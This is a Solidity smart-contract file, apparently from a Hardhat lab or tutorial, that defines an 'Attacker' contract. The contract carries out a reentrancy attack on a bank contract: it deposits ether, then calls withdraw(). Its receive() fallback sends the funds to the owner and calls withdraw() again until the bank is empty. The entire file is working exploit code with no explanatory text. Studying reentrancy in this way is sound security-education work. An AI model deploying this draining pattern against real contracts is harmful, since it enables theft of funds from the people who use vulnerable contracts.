pragma solidity ^0.8.0;

import "hardhat/console.sol";

import "@openzeppelin/contracts/access/Ownable.sol";

interface IBank {
  function deposit() external payable;
  function withdraw() external;
}

contract Attacker is Ownable {
  IBank public immutable bankContract;

  constructor(address bankContractAddress) {
    bankContract = IBank(bankContractAddress);
  }

  function attack() external payable onlyOwner {
    bankContract.deposit{ value: msg.value }();
    bankContract.withdraw();
  }

  receive() external payable {
    // console.log(address(bankContract).balance);
    payable(owner()).transfer(address(this).balance);

    if (address(bankContract).balance > 0) {
      bankContract.withdraw();
    }
  }
}